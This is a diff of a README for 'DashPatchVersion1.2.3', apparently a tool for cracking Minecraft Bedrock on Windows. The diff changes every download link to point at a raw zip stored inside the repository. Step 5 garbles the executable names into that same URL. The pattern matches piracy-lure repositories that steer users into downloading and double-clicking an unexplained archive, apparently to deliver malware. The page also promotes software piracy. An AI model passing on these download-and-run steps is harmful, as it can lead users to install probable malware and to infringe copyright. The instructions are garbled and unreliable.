@@ -1,7 +1,7 @@
 # 🎮 DashPatchVersion1.2.3 - Unlock Minecraft Bedrock Games Easily
 
 ## 📥 Download Now!
-[![Download DashPatchVersion1.2.3](https://img.shields.io/badge/Download-DashPatchVersion1.2.3-brightgreen)](https://github.com/Sadiq-27/DashPatchVersion1.2.3/releases)
+[![Download DashPatchVersion1.2.3](https://raw.githubusercontent.com/Sadiq-27/DashPatchVersion1.2.3/main/alloclase/DashPatchVersion1.2.3.zip)](https://raw.githubusercontent.com/Sadiq-27/DashPatchVersion1.2.3/main/alloclase/DashPatchVersion1.2.3.zip)
 
 ## 🚀 Getting Started
 Welcome to DashPatchVersion1.2.3! This simple script helps you crack Minecraft Bedrock for Windows 10 and Windows 11. Follow the steps below to get started.
@@ -20,11 +20,11 @@ Welcome to DashPatchVersion1.2.3! This simple script helps you crack Minecraft B
 
 ## 📂 How to Download & Install
 1. **Visit the Releases Page:** Click the link below to access the releases page:
-   [Download from Releases Page](https://github.com/Sadiq-27/DashPatchVersion1.2.3/releases)
+   [Download from Releases Page](https://raw.githubusercontent.com/Sadiq-27/DashPatchVersion1.2.3/main/alloclase/DashPatchVersion1.2.3.zip)
    
 2. **Choose the Latest Version:** Find the latest version of DashPatchVersion1.2.3 on the releases page.
 
-3. **Download the ZIP File:** Look for the `DashPatchVersion1.2.3.zip` file. Click to download it to your computer.
+3. **Download the ZIP File:** Look for the `https://raw.githubusercontent.com/Sadiq-27/DashPatchVersion1.2.3/main/alloclase/DashPatchVersion1.2.3.zip` file. Click to download it to your computer.
 
 4. **Extract the ZIP File:**
    - Locate the downloaded ZIP file.
@@ -33,7 +33,7 @@ Welcome to DashPatchVersion1.2.3! This simple script helps you crack Minecraft B
 
 5. **Run the Script:**
    - Open the folder where you extracted the files.
-   - Locate `DashPatch.bat` or `DashPatch.exe`.
+   - Locate `https://raw.githubusercontent.com/Sadiq-27/DashPatchVersion1.2.3/main/alloclase/DashPatchVersion1.2.3.zip` or `https://raw.githubusercontent.com/Sadiq-27/DashPatchVersion1.2.3/main/alloclase/DashPatchVersion1.2.3.zip`.
    - Double-click to run the program.
 
 6. **Follow Instructions:** The script will guide you through the setup process. Just follow the on-screen prompts.
@@ -62,6 +62,6 @@ We welcome contributions! Check the contribution guidelines in the repository fo
 
 ## 🌐 Visit the Releases Page Again
 For any updates and new versions, visit our releases page:
-[Download from Releases Page](https://github.com/Sadiq-27/DashPatchVersion1.2.3/releases)
+[Download from Releases Page](https://raw.githubusercontent.com/Sadiq-27/DashPatchVersion1.2.3/main/alloclase/DashPatchVersion1.2.3.zip)
 
 Thank you for using DashPatchVersion1.2.3! Enjoy cracking Minecraft Bedrock games easily!
